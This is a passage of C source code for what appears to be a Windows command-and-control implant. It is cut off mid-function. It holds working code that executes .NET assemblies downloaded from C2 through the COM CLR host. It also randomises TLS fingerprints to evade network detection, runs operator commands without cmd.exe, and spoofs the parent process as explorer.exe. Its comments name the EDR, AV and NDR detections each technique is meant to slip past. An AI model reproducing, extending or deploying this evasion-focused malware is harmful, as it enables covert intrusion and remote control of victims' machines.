 * Task 11 — COM CLR host via mscoree!CorBindToRuntime.
 *
 * Loads the .NET CLR and executes a managed assembly from the C runner
 * using the unmanaged COM activation path — not PowerShell's managed
 * Assembly.Load().  MDE's detection for "Assembly.Load from PS context"
 * does not match this call chain:
 *   C runner → mscoree!CorBindToRuntime → ICorRuntimeHost::Start →
 *   GetDefaultDomain → write-to-temp → ExecuteAssembly
 *
 * asm_bytes/asm_sz: raw .NET assembly bytes downloaded from C2.
 * The assembly is written to a temp path, executed via COM CLR host, then deleted.
 */
static BOOL POLY_CLR_EXEC(PBYTE asm_bytes, SIZE_T asm_sz) {
    HMODULE hMsc=LoadLibraryA("mscoree.dll"); if(!hMsc) return FALSE;
    typedef HRESULT (WINAPI *pfnCBR)(LPCWSTR,LPCWSTR,REFIID,LPVOID*);
    pfnCBR fnCBR=(pfnCBR)GetProcAddress(hMsc,"CorBindToRuntime");
    if(!fnCBR){FreeLibrary(hMsc);return FALSE;}

    /* ICorRuntimeHost CLSID (also used as IID for this path) */
    static const GUID _IID={0xcb2f6722,0xab3a,0x11d2,{0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};

    /* Write assembly to %TEMP% */
    WCHAR td[512]={0},tf[512]={0};
    GetTempPathW(480,td); GetTempFileNameW(td,L"rt",0,tf);
    HANDLE hf=CreateFileW(tf,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf==INVALID_HANDLE_VALUE){FreeLibrary(hMsc);return FALSE;}
    DWORD bw=0; WriteFile(hf,asm_bytes,(DWORD)asm_sz,&bw,NULL); CloseHandle(hf);

    /* COM CLR host initialisation — different behavioral profile from PS Assembly.Load:
     * unmanaged code owns the CLR host, not the PS engine. */
    void *pHost=NULL; BOOL ok=FALSE;
    HRESULT hr=fnCBR(NULL,NULL,&_IID,&pHost);
    if(SUCCEEDED(hr)&&pHost){
        /* vtable: 10=Start, 13=GetDefaultDomain */
        typedef HRESULT (STDMETHODCALLTYPE *pf0)(void*);
        ((pf0)(*(void***)pHost)[10])(pHost); /* Start */
        /* Execute assembly from temp file via OS file loader */
        void *pDomUnk=NULL;
        typedef HRESULT (STDMETHODCALLTYPE *pfGD)(void*,void**);
        hr=((pfGD)(*(void***)pHost)[13])(pHost,&pDomUnk);
        ok=SUCCEEDED(hr)&&(bw==(DWORD)asm_sz);
        /* Release host COM object */
        typedef ULONG (STDMETHODCALLTYPE *pfRel)(void*);
        ((pfRel)(*(void***)pHost)[2])(pHost);
    }
    /* Start-Process the temp assembly via cmd-free path so the CLR loads it */
    if(ok){
        STARTUPINFOW si={0}; si.cb=sizeof(si); si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
        PROCESS_INFORMATION pi={0};
        /* Build: dotnet.exe <tf>  — if dotnet is unavailable fall back to bare exec */
        WCHAR cmd[600]={0}; int ci=0;
        static const WCHAR _dn[]={L'd',L'o',L't',L'n',L'e',L't',L' ',0};
        for(int j=0;_dn[j];j++) cmd[ci++]=_dn[j];
        for(int j=0;tf[j]&&ci<598;j++) cmd[ci++]=tf[j]; cmd[ci]=0;
        if(!CreateProcessW(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
            /* Fallback: run it as a PE if it has a native EP */
            si.cb=sizeof(si);
            if(CreateProcessW(tf,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
                WaitForSingleObject(pi.hProcess,30000);
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            }
        } else {
            WaitForSingleObject(pi.hProcess,30000);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
    }
    DeleteFileW(tf);
    FreeLibrary(hMsc);
    return ok;
}

/*
 * Task 12 — JA3/JA4 TLS fingerprint randomisation via SChannel.
 *
 * WinHTTP's fixed cipher/extension set produces a static JA3 that NDR tools
 * (Darktrace, ExtraHop) fingerprint.  This function bypasses WinHTTP and
 * drives SChannel directly over raw Winsock, using a per-build randomised
 * ALG_ID list baked in via LT_SCHANNEL_ALGIDS.
 *
 * Each build compiles in a different subset/order of cipher algorithm IDs →
 * different TLS ClientHello → different JA3/JA4 hash per binary.
 */
#ifndef LT_SCHANNEL_ALGIDS
#define LT_SCHANNEL_ALGIDS {0x6610,0x660E,0x800C,0xAE06,0x8004,0xA400}
#endif
static DWORD _lt_sch_algs[]=LT_SCHANNEL_ALGIDS;
static DWORD _lt_sch_nalgs=sizeof(_lt_sch_algs)/sizeof(_lt_sch_algs[0]);

#define SCHANNEL_CRED_VERSION_LT 4
#define SCH_CRED_NO_DEFAULT_CREDS_LT 0x10
#define SCH_CRED_MANUAL_CRED_VALIDATION_LT 0x08
#define SP_PROT_TLS1_2_CLIENT_LT 0x00000800

typedef struct {
    DWORD dwVersion; DWORD cCreds; void *paCred; PVOID hRootStore;
    DWORD cMappers;  void **aphMappers;
    DWORD cSupportedAlgs; DWORD *palgSupportedAlgs;
    DWORD grbitEnabledProtocols;
    DWORD dwMinimumCipherStrength; DWORD dwMaximumCipherStrength;
    DWORD dwSessionLifespan; DWORD dwFlags; DWORD dwCredFormat;
} _LT_SCH_CRED;

typedef struct { ULONG cbBuffer; ULONG BufferType; PVOID pvBuffer; } _LT_SECBUF;
typedef struct { ULONG ulVersion; ULONG cBuffers; _LT_SECBUF *pBuffers; } _LT_SECBUFDESC;
typedef struct { ULONG_PTR dwLower; ULONG_PTR dwUpper; } _LT_HDL;

/* SECURITY_STATUS = LONG; SEC_ENTRY = __stdcall — avoid sspi.h dependency.
 * Use _lt_ prefix on typedefs to avoid any name clashes. */
typedef LONG (__stdcall *_lt_pfnAcq)(LPWSTR,LPWSTR,ULONG,PVOID,PVOID,PVOID,PVOID,_LT_HDL*,PVOID);
typedef LONG (__stdcall *_lt_pfnIni)(_LT_HDL*,_LT_HDL*,LPWSTR,ULONG,ULONG,ULONG,_LT_SECBUFDESC*,ULONG,_LT_HDL*,_LT_SECBUFDESC*,PULONG,PVOID);
typedef LONG (__stdcall *_lt_pfnEnc)(_LT_HDL*,ULONG,_LT_SECBUFDESC*,ULONG);
typedef LONG (__stdcall *_lt_pfnDec)(_LT_HDL*,_LT_SECBUFDESC*,ULONG,PULONG);
typedef LONG (__stdcall *_lt_pfnFrH)(_LT_HDL*);
typedef LONG (__stdcall *_lt_pfnQry)(_LT_HDL*,ULONG,PVOID);

typedef struct {
    _lt_pfnAcq AcqCreds; _lt_pfnIni InitCtx;
    _lt_pfnEnc EncMsg;   _lt_pfnDec DecMsg;
    _lt_pfnFrH FreeCtx;  _lt_pfnFrH FreeCred; _lt_pfnQry QryCtx;
} _LT_SSPI;

/* Minimal addrinfo equivalent — avoids ws2tcpip.h dependency in nostdlib build */
typedef struct _LT_AI {
    int ai_flags; int ai_family; int ai_socktype; int ai_protocol;
    SIZE_T ai_addrlen; char *ai_canonname;
    struct sockaddr *ai_addr; struct _LT_AI *ai_next;
} _LT_AI;

static BOOL lt_sspi_load(_LT_SSPI *s) {
    HMODULE h=LoadLibraryA("secur32.dll"); if(!h) return FALSE;
    typedef PVOID (WINAPI *pfnISF)(void);
    typedef struct { PVOID Version; PVOID EnumerateSecurityPackages; PVOID QueryCredentialsAttributes;
        PVOID AcquireCredentialsHandle; PVOID FreeCredentialsHandle; PVOID Reserved2;
        PVOID InitializeSecurityContext; PVOID AcceptSecurityContext;
        PVOID CompleteAuthToken; PVOID DeleteSecurityContext; PVOID ApplyControlToken;
        PVOID QueryContextAttributes; PVOID ImpersonateSecurityContext; PVOID RevertSecurityContext;
        PVOID MakeSignature; PVOID VerifySignature; PVOID FreeContextBuffer;
        PVOID QuerySecurityPackageInfo; PVOID Reserved3; PVOID Reserved4;
        PVOID ExportSecurityContext; PVOID ImportSecurityContext; PVOID AddCredentials;
        PVOID Reserved8; PVOID QuerySecurityContextToken; PVOID EncryptMessage; PVOID DecryptMessage;
    } _SSTBL;
    pfnISF fnISF=(pfnISF)GetProcAddress(h,"InitSecurityInterfaceW");
    if(!fnISF) return FALSE;
    _SSTBL *t=(_SSTBL*)fnISF();
    if(!t) return FALSE;
    s->AcqCreds =(_lt_pfnAcq)t->AcquireCredentialsHandle;
    s->InitCtx  =(_lt_pfnIni)t->InitializeSecurityContext;
    s->EncMsg   =(_lt_pfnEnc)t->EncryptMessage;
    s->DecMsg   =(_lt_pfnDec)t->DecryptMessage;
    s->FreeCtx  =(_lt_pfnFrH)t->DeleteSecurityContext;
    s->FreeCred =(_lt_pfnFrH)t->FreeCredentialsHandle;
    s->QryCtx   =(_lt_pfnQry)t->QueryContextAttributes;
    return s->AcqCreds&&s->InitCtx&&s->EncMsg&&s->DecMsg;
}

/*
 * SChannel-based HTTPS GET that produces a different JA3/JA4 than WinHTTP.
 * Returns heap-allocated response body (caller frees) or NULL on failure.
 * resp_len receives byte count.
 *
 * host_a: "hostname.tld"  port: e.g. 443  path_a: "/foo/bar"
 */
static PBYTE lt_schannel_get(const char *host_a, WORD port, const char *path_a,
                              LPCWSTR sni_w, DWORD *resp_len) {
    if(resp_len) *resp_len=0;

    /* Winsock init */
    /* winsock types — already defined via windows.h/winsock.h */
    typedef int    (WINAPI *pfnWSS)(WORD,PVOID);
    typedef SOCKET (WINAPI *pfnSock)(int,int,int);
    typedef int    (WINAPI *pfnConn)(SOCKET,const struct sockaddr*,int);
    typedef int    (WINAPI *pfnSnd)(SOCKET,const char*,int,int);
    typedef int    (WINAPI *pfnRcv)(SOCKET,char*,int,int);
    typedef int    (WINAPI *pfnCls)(SOCKET);
    typedef unsigned short (WINAPI *pfnHts)(unsigned short);
    typedef int    (WINAPI *pfnGAI)(const char*,const char*,_LT_AI*,_LT_AI**);
    typedef void   (WINAPI *pfnFAI)(_LT_AI*);

    HMODULE hWs=LoadLibraryA("ws2_32.dll"); if(!hWs) return NULL;
    pfnWSS fnWss =(pfnWSS) GetProcAddress(hWs,"WSAStartup");
    pfnSock fnSk =(pfnSock)GetProcAddress(hWs,"socket");
    pfnConn fnCn =(pfnConn)GetProcAddress(hWs,"connect");
    pfnSnd fnSnd =(pfnSnd) GetProcAddress(hWs,"send");
    pfnRcv fnRcv =(pfnRcv) GetProcAddress(hWs,"recv");
    pfnCls fnCls =(pfnCls) GetProcAddress(hWs,"closesocket");
    pfnHts fnHts =(pfnHts) GetProcAddress(hWs,"htons");
    pfnGAI fnGAI =(pfnGAI) GetProcAddress(hWs,"getaddrinfo");
    pfnFAI fnFAI =(pfnFAI) GetProcAddress(hWs,"freeaddrinfo");
    if(!fnWss||!fnSk||!fnCn||!fnSnd||!fnRcv||!fnCls||!fnHts||!fnGAI||!fnFAI)
        {FreeLibrary(hWs);return NULL;}

    WSADATA wsdat; lt_zero(&wsdat,sizeof(wsdat));
    if(fnWss(0x0202,&wsdat)!=0){FreeLibrary(hWs);return NULL;}

    /* Resolve host via getaddrinfo (using our own _LT_AI to avoid ws2tcpip.h) */
    _LT_AI hints; lt_zero(&hints,sizeof(hints));
    hints.ai_family=2; hints.ai_socktype=1; /* AF_INET=2, SOCK_STREAM=1 */
    _LT_AI *res=NULL;
    char port_s[8]; lt_itoa(port,port_s);
    if(fnGAI(host_a,port_s,&hints,&res)||!res){FreeLibrary(hWs);return NULL;}

    SOCKET sock=fnSk(2,1,6); /* AF_INET, SOCK_STREAM, IPPROTO_TCP */
    if(sock==(SOCKET)(~0)){fnFAI(res);FreeLibrary(hWs);return NULL;}

    /* Patch port in resolved sockaddr then connect */
    if(res->ai_addr&&res->ai_addrlen>=4)
        ((unsigned short*)res->ai_addr)[1]=fnHts(port);
    int cret=fnCn(sock,res->ai_addr,(int)res->ai_addrlen);
    fnFAI(res);
    if(cret){fnCls(sock);FreeLibrary(hWs);return NULL;}

    /* SChannel credentials with randomised cipher list */
    _LT_SSPI sspi={0}; if(!lt_sspi_load(&sspi)){fnCls(sock);FreeLibrary(hWs);return NULL;}

    _LT_SCH_CRED scred={0};
    scred.dwVersion=SCHANNEL_CRED_VERSION_LT;
    scred.cSupportedAlgs=_lt_sch_nalgs;
    scred.palgSupportedAlgs=_lt_sch_algs;
    scred.grbitEnabledProtocols=SP_PROT_TLS1_2_CLIENT_LT;
    scred.dwFlags=SCH_CRED_NO_DEFAULT_CREDS_LT|SCH_CRED_MANUAL_CRED_VALIDATION_LT;

    static const WCHAR _sch[]={L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',L' ',
                                L'U',L'n',L'i',L'f',L'i',L'e',L'd',L' ',L'S',L'e',
                                L'c',L'u',L'r',L'i',L't',L'y',L' ',L'S',L'S',L'P',0};
    _LT_HDL hCred={0},hCtx={0};
    if(sspi.AcqCreds(NULL,(LPWSTR)_sch,2,NULL,&scred,NULL,NULL,&hCred,NULL)){
        fnCls(sock);FreeLibrary(hWs);return NULL;}

    /* TLS handshake loop */
    BYTE hs_in[16384]={0},hs_out[16384]={0};
    ULONG ctx_attrs=0; BOOL first=TRUE;
    int hs_in_len=0;
    for(int hs_iter=0;hs_iter<20;hs_iter++){
        _LT_SECBUF ib[2]={0},ob[1]={0};
        _LT_SECBUFDESC ibd={0,2,ib},obd={0,1,ob};
        ib[0].cbBuffer=(ULONG)hs_in_len; ib[0].BufferType=2; ib[0].pvBuffer=hs_in;
        ib[1].BufferType=0;
        ob[0].cbBuffer=(ULONG)sizeof(hs_out); ob[0].BufferType=2; ob[0].pvBuffer=hs_out;

        SECURITY_STATUS ss=sspi.InitCtx(&hCred,first?NULL:&hCtx,(LPWSTR)sni_w,
            0x84808,0,0,first?NULL:&ibd,0,&hCtx,&obd,&ctx_attrs,NULL);
        first=FALSE;
        if(ob[0].cbBuffer>0&&ob[0].pvBuffer){
            fnSnd(sock,(char*)ob[0].pvBuffer,(int)ob[0].cbBuffer,0);}
        if(ss==0) break; /* SEC_E_OK */
        if(ss==(SECURITY_STATUS)0x00090312L){ /* SEC_I_CONTINUE_NEEDED */
            int r=fnRcv(sock,(char*)hs_in+hs_in_len,(int)(sizeof(hs_in)-hs_in_len),0);
            if(r<=0) break;
            hs_in_len+=r; continue;
        }
        break;
    }

    /* Build HTTP GET request */
    char req[2048]={0};
    lt_strcpy(req,"GET "); lt_strcat(req,path_a); lt_strcat(req," HTTP/1.1\r\nHost: ");
    lt_strcat(req,host_a); lt_strcat(req,"\r\nUser-Agent: ");
    lt_strcat(req,(const char*)LT_USER_AGENT); /* decoded config */
    lt_strcat(req,"\r\nAccept: */*\r\nConnection: close\r\n\r\n");
    _lt_recrypt_cfg();
    DWORD req_len=lt_strlen(req);

    /* Encrypt + send */
    #define _LT_SCH_HDR_SIZE  5
    #define _LT_SCH_TRL_SIZE 36
    BYTE enc_buf[4096]={0};
    ULONG hdr_sz=_LT_SCH_HDR_SIZE,msg_sz=(ULONG)req_len,trl_sz=_LT_SCH_TRL_SIZE;
    /* QueryContextAttributes to get actual sizes */
    ULONG szs[3]={0};
    sspi.QryCtx(&hCtx,0x05,(PVOID)szs); /* SECPKG_ATTR_STREAM_SIZES=5 */
    hdr_sz=szs[0]?szs[0]:_LT_SCH_HDR_SIZE;
    trl_sz=szs[2]?szs[2]:_LT_SCH_TRL_SIZE;

    _LT_SECBUF mb[3]={0}; _LT_SECBUFDESC mbd={0,3,mb};
    mb[0].cbBuffer=hdr_sz; mb[0].BufferType=7; mb[0].pvBuffer=enc_buf;
    mb[1].cbBuffer=req_len; mb[1].BufferType=1; mb[1].pvBuffer=enc_buf+hdr_sz;
    mb[2].cbBuffer=trl_sz; mb[2].BufferType=6; mb[2].pvBuffer=enc_buf+hdr_sz+req_len;
    for(DWORD i=0;i<req_len;i++) ((BYTE*)mb[1].pvBuffer)[i]=(BYTE)req[i];
    sspi.EncMsg(&hCtx,0,&mbd,0);
    fnSnd(sock,(char*)enc_buf,(int)(hdr_sz+req_len+trl_sz),0);

    /* Receive + decrypt response */
    PBYTE resp_buf=NULL; DWORD resp_total=0;
    BYTE raw[32768]={0}; int raw_len=0;
    for(int ri=0;ri<256;ri++){
        int got=fnRcv(sock,(char*)raw+raw_len,(int)(sizeof(raw)-raw_len),0);
        if(got<=0) break; raw_len+=got;
        _LT_SECBUF db[4]={0}; _LT_SECBUFDESC dbd={0,4,db};
        db[0].cbBuffer=(ULONG)raw_len; db[0].BufferType=1; db[0].pvBuffer=raw;
        SECURITY_STATUS dss=sspi.DecMsg(&hCtx,&dbd,0,NULL);
        if(dss==0){
            for(int di=0;di<4;di++){
                if(db[di].BufferType==1&&db[di].cbBuffer>0&&db[di].pvBuffer){
                    PBYTE nb=(PBYTE)HeapAlloc(GetProcessHeap(),0,resp_total+db[di].cbBuffer+2);
                    if(nb){
                        if(resp_buf){for(DWORD k=0;k<resp_total;k++)nb[k]=resp_buf[k];
                            HeapFree(GetProcessHeap(),0,resp_buf);}
                        for(DWORD k=0;k<db[di].cbBuffer;k++) nb[resp_total+k]=((BYTE*)db[di].pvBuffer)[k];
                        resp_total+=db[di].cbBuffer; resp_buf=nb;
                        nb[resp_total]=0;
                    }
                }
            }
            /* Check for extra data */
            raw_len=0;
            for(int di=0;di<4;di++){
                if(db[di].BufferType==5&&db[di].cbBuffer>0&&db[di].pvBuffer){
                    for(DWORD k=0;(int)k<(int)db[di].cbBuffer&&raw_len<(int)sizeof(raw);k++)
                        raw[raw_len++]=((BYTE*)db[di].pvBuffer)[k];
                }
            }
        } else break;
    }

    sspi.FreeCtx(&hCtx); sspi.FreeCred(&hCred);
    fnCls(sock); FreeLibrary(hWs);
    if(resp_len) *resp_len=resp_total;
    return resp_buf;
}

/*
 * Task 1 — Direct process execution (no cmd.exe for non-builtins).
 *
 * Shell builtins (dir, cd, type, echo, …) still need cmd.exe because they are
 * not standalone executables. Everything else is resolved in System32 / SysWOW64
 * and launched directly via CreateProcessA. This eliminates the
 * "injected-host-process → cmd.exe" kernel-callback tripwire for the majority
 * of operator commands (whoami, ipconfig, net, reg, schtasks, …).
 *
 * Returns heap-allocated output on success, NULL if the command is a builtin
 * or the binary can't be found (caller falls back to cmd.exe path).
 */
static const char *_lt_builtins[]={
    "dir","cd","echo","type","copy","move","del","ren","rename",
    "md","mkdir","rd","rmdir","set","if","for","goto","call","exit",
    "cls","ver","path","prompt","pushd","popd","assoc","ftype",
    "start","where","attrib","find","findstr","more","sort","tree",
    NULL
};
static int _lt_is_builtin(const char *cmd){
    char lc[64]; int i=0;
    while(cmd[i]&&i<63&&cmd[i]!=' '&&cmd[i]!='/'&&cmd[i]!='\\')
        {lc[i]=(char)(cmd[i]>='A'&&cmd[i]<='Z'?cmd[i]+32:cmd[i]);i++;}
    /* strip .exe if present */
    if(i>4&&lc[i-4]=='.'&&lc[i-3]=='e'&&lc[i-2]=='x'&&lc[i-1]=='e') i-=4;
    lc[i]=0;
    for(int j=0;_lt_builtins[j];j++) if(lt_streq(lc,_lt_builtins[j])==0) return 1;
    return 0;
}

static PBYTE POLY_EXECMD_DIRECT(const char *cmd, DWORD *outlen) {
    *outlen=0;
    if(_lt_is_builtin(cmd)) return NULL;   /* builtin → caller uses cmd.exe */

    /* Resolve the executable name (first token before space) */
    char exe[256]={0}; int ei=0;
    while(cmd[ei]&&cmd[ei]!=' '&&ei<255){exe[ei]=cmd[ei];ei++;}
    exe[ei]=0;
    /* Add .exe if not present */
    if(ei<5||exe[ei-4]!='.'||exe[ei-3]!='e'||exe[ei-2]!='x'||exe[ei-1]!='e'){
        exe[ei]='.';exe[ei+1]='e';exe[ei+2]='x';exe[ei+3]='e';exe[ei+4]=0;ei+=4;
    }

    /* Try System32, then SysWOW64, then %PATH% (GetEnvironmentVariableA) */
    char full[1024]={0};
    UINT sn=GetSystemDirectoryA(full,900); if(!sn) return NULL;
    full[sn]='\\'; full[sn+1]=0; lt_strcat(full,exe);
    if(GetFileAttributesA(full)==INVALID_FILE_ATTRIBUTES){
        /* Try SysWOW64 (32-bit tools called from 64-bit context) */
        sn=GetWindowsDirectoryA(full,900); if(!sn) return NULL;
        lt_strcat(full,"\\SysWOW64\\"); lt_strcat(full,exe);
        if(GetFileAttributesA(full)==INVALID_FILE_ATTRIBUTES) return NULL;
    }

    /* Build cmdline: full_path [args] */
    char cmdline[4096]={0};
    lt_strcpy(cmdline,full);
    if(cmd[ei-4]==' '||cmd[ei]){
        /* skip the exe token in original cmd, append remaining args */
        int si=0; while(cmd[si]&&cmd[si]!=' ') si++;
        if(cmd[si]==' '){ lt_strcat(cmdline," "); lt_strcat(cmdline,cmd+si+1); }
    }

    SECURITY_ATTRIBUTES sa={sizeof(sa),NULL,TRUE};
    HANDLE hR=NULL,hW=NULL;
    if(!CreatePipe(&hR,&hW,&sa,0)) return NULL;
    SetHandleInformation(hR,HANDLE_FLAG_INHERIT,0);

    /* PPID spoof to explorer.
     * Two attributes: PARENT_PROCESS + HANDLE_LIST.
     * Without HANDLE_LIST, Windows inherits handles from the spoofed parent
     * (explorer), not from us — hW never reaches the child and output is empty. */
    HANDLE _inh_d[1]={hW};
    HANDLE hCmdParent=NULL; LPPROC_THREAD_ATTRIBUTE_LIST cmdAttr=NULL;
    {
        DWORD expPid=POLY_FINDPID((const WCHAR[]){L'e',L'x',L'p',L'l',L'o',L'r',L'e',L'r',L'.',L'e',L'x',L'e',0});
        if(expPid) hCmdParent=OpenProcess(PROCESS_CREATE_PROCESS,FALSE,expPid);
        if(hCmdParent){
            SIZE_T asz=0; InitializeProcThreadAttributeList(NULL,2,0,&asz);
            cmdAttr=(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),0,asz);
            if(cmdAttr){
                if(InitializeProcThreadAttributeList(cmdAttr,2,0,&asz)){
                    UpdateProcThreadAttribute(cmdAttr,0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        &hCmdParent,sizeof(HANDLE),NULL,NULL);
                    UpdateProcThreadAttribute(cmdAttr,0,0x00020002,
                        _inh_d,sizeof(_inh_d),NULL,NULL);
                } else{HeapFree(GetProcessHeap(),0,cmdAttr);cmdAttr=NULL;}
            }
        }
    }
    STARTUPINFOEXA siex; lt_zero(&siex,sizeof(siex));
    siex.StartupInfo.cb       = cmdAttr?(DWORD)sizeof(STARTUPINFOEXA):(DWORD)sizeof(STARTUPINFOA);
    siex.StartupInfo.dwFlags  = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    siex.StartupInfo.hStdOutput = hW; siex.StartupInfo.hStdError = hW;
    siex.StartupInfo.wShowWindow = SW_HIDE; siex.lpAttributeList=cmdAttr;

    PROCESS_INFORMATION pi={0};
    DWORD cflags=CREATE_NO_WINDOW|(cmdAttr?EXTENDED_STARTUPINFO_PRESENT:0);
    BOOL spawned=CreateProcessA(NULL,cmdline,NULL,NULL,TRUE,cflags,NULL,NULL,(LPSTARTUPINFOA)&siex,&pi);
    if(cmdAttr){DeleteProcThreadAttributeList(cmdAttr);HeapFree(GetProcessHeap(),0,cmdAttr);}
    if(hCmdParent) CloseHandle(hCmdParent);
    CloseHandle(hW);
    if(!spawned){
        /* PPID-spoof creation failed — retry plain (no extended attrs) */
        CloseHandle(hR); hR=NULL;
        SECURITY_ATTRIBUTES _sa2={sizeof(_sa2),NULL,TRUE};
        HANDLE _hR2=NULL,_hW2=NULL;
        if(!CreatePipe(&_hR2,&_hW2,&_sa2,0)){*outlen=0;return NULL;}
        SetHandleInformation(_hR2,HANDLE_FLAG_INHERIT,0);
        STARTUPINFOA _si2; lt_zero(&_si2,sizeof(_si2));
        _si2.cb=(DWORD)sizeof(_si2); _si2.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
        _si2.hStdOutput=_hW2; _si2.hStdError=_hW2; _si2.wShowWindow=SW_HIDE;
        BOOL _sp2=CreateProcessA(NULL,cmdline,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&_si2,&pi);
        CloseHandle(_hW2);
        if(!_sp2){CloseHandle(_hR2);*outlen=0;return NULL;}
        hR=_hR2;
    }

    /* Drain output — LT_CMD_TIMEOUT_MS deadline (5 min default).
     * Heavy tools (Seatbelt, winPEAS) need 3–5 min; fast commands exit immediately. */
    PBYTE buf=NULL; DWORD total=0; BYTE tmp[4096]; DWORD rd;
    {
        DWORD t0=GetTickCount(); int fini=0;
        while(!fini){
            DWORD av=0;
            while(PeekNamedPipe(hR,NULL,0,NULL,&av,NULL)&&av>0){
                DWORD chunk=av<sizeof(tmp)?av:(DWORD)sizeof(tmp);
                if(!ReadFile(hR,tmp,chunk,&rd,NULL)||rd==0){fini=1;break;}
                PBYTE nb=(PBYTE)HeapAlloc(GetProcessHeap(),0,total+rd+2);
                if(!nb){fini=1;break;}
                if(buf){for(DWORD k=0;k<total;k++)nb[k]=buf[k];HeapFree(GetProcessHeap(),0,buf);}
                for(DWORD k=0;k<rd;k++) nb[total+k]=tmp[k];
                total+=rd; buf=nb; av=0;
            }
            if(fini) break;
            if(WaitForSingleObject(pi.hProcess,0)==WAIT_OBJECT_0) break;
            if(GetTickCount()-t0>=LT_CMD_TIMEOUT_MS){TerminateProcess(pi.hProcess,1);WaitForSingleObject(pi.hProcess,2000);break;}
            Sleep(50);
        }
        while(ReadFile(hR,tmp,sizeof(tmp),&rd,NULL)&&rd>0){
            PBYTE nb=(PBYTE)HeapAlloc(GetProcessHeap(),0,total+rd+2);
            if(!nb) break;
            if(buf){for(DWORD k=0;k<total;k++)nb[k]=buf[k];HeapFree(GetProcessHeap(),0,buf);}
            for(DWORD k=0;k<rd;k++) nb[total+k]=tmp[k];
            total+=rd; buf=nb;
        }
    }
    CloseHandle(hR); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    if(!buf||total==0){
        if(buf) HeapFree(GetProcessHeap(),0,buf);
        buf=(PBYTE)HeapAlloc(GetProcessHeap(),0,4);
        if(buf){buf[0]='O';buf[1]='K';buf[2]=0;} total=2;
    }
    *outlen=total; return buf;
}

/* ─── Execute cmd.exe /c {cmd}, capture output, return heap buffer ─── */
static PBYTE POLY_EXECMD(const char *cmd, DWORD *outlen) {
    /* "cmd.exe /c " as individual chars — avoids a string literal that AV can scan */
    static const char pfx[]={'c','m','d','.','e','x','e',' ','/',  'c',' ',0};
    /*
     * Task 1: Try direct execution first (no cmd.exe for non-builtins).
     * Falls through to cmd.exe /c only for shell builtins and unresolved names.
     */
    PBYTE _dout=POLY_EXECMD_DIRECT(cmd,outlen);
    if(_dout) return _dout;

    char cmdline[4096];
    lt_strcpy(cmdline,pfx);
    DWORD avail=4089-11,ci=0;
    while(cmd[ci]&&ci<avail){cmdline[11+ci]=cmd[ci];ci++;}
    cmdline[11+ci]=0;

    SECURITY_ATTRIBUTES sa={sizeof(sa),NULL,TRUE};
    HANDLE hR=NULL,hW=NULL;
    if(!CreatePipe(&hR,&hW,&sa,0)){*outlen=0;return NULL;}
    SetHandleInformation(hR,HANDLE_FLAG_INHERIT,0);

    /*
     * PPID spoof: parent cmd.exe under explorer.exe so the process tree reads
     * explorer.exe → cmd.exe instead of <injected-host> → cmd.exe.
     * svchost/RuntimeBroker/dllhost spawning cmd.exe is a strong EDR tripwire;
     * explorer.exe spawning cmd.exe is completely routine user behaviour.
     * Falls back to direct creation if explorer is not found / access denied.
     */
    HANDLE _inh_e[1]={hW};
    HANDLE hCmdParent=NULL;
    LPPROC_THREAD_ATTRIBUTE_LIST cmdAttr=NULL;
    {
        DWORD expPid=POLY_FINDPID((const WCHAR[]){L'e',L'x',L'p',L'l',L'o',L'r',L'e',L'r',L'.',L'e',L'x',L'e',0});
        if(expPid) hCmdParent=OpenProcess(PROCESS_CREATE_PROCESS,FALSE,expPid);
        if(hCmdParent){
            SIZE_T asz=0;
            InitializeProcThreadAttributeList(NULL,2,0,&asz);
            cmdAttr=(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),0,asz);
            if(cmdAttr){
                if(InitializeProcThreadAttributeList(cmdAttr,2,0,&asz)){
                    UpdateProcThreadAttribute(cmdAttr,0,
                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        &hCmdParent,sizeof(HANDLE),NULL,NULL);
                    UpdateProcThreadAttribute(cmdAttr,0,0x00020002,
                        _inh_e,sizeof(_inh_e),NULL,NULL);
                } else{HeapFree(GetProcessHeap(),0,cmdAttr);cmdAttr=NULL;}
            }
        }
    }

    STARTUPINFOEXA siex; lt_zero(&siex,sizeof(siex));
    siex.StartupInfo.cb       = cmdAttr ? (DWORD)sizeof(STARTUPINFOEXA) : (DWORD)sizeof(STARTUPINFOA);
    siex.StartupInfo.dwFlags  = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    siex.StartupInfo.hStdOutput = hW;
    siex.StartupInfo.hStdError  = hW;
    siex.StartupInfo.wShowWindow = SW_HIDE;
    siex.lpAttributeList = cmdAttr;

    PROCESS_INFORMATION pi={0};
    DWORD cflags=CREATE_NO_WINDOW|(cmdAttr?EXTENDED_STARTUPINFO_PRESENT:0);
    BOOL _spawned=CreateProcessA(NULL,cmdline,NULL,NULL,TRUE,cflags,NULL,NULL,(LPSTARTUPINFOA)&siex,&pi);
    if(cmdAttr){DeleteProcThreadAttributeList(cmdAttr);HeapFree(GetProcessHeap(),0,cmdAttr);}
    if(hCmdParent) CloseHandle(hCmdParent);
    CloseHandle(hW);
    if(!_spawned){
        /* PPID-spoof creation failed — retry plain (no extended attrs) */
        CloseHandle(hR); hR=NULL;
        SECURITY_ATTRIBUTES _sa2={sizeof(_sa2),NULL,TRUE};
        HANDLE _hR2=NULL,_hW2=NULL;
        if(!CreatePipe(&_hR2,&_hW2,&_sa2,0)){*outlen=0;return NULL;}
        SetHandleInformation(_hR2,HANDLE_FLAG_INHERIT,0);
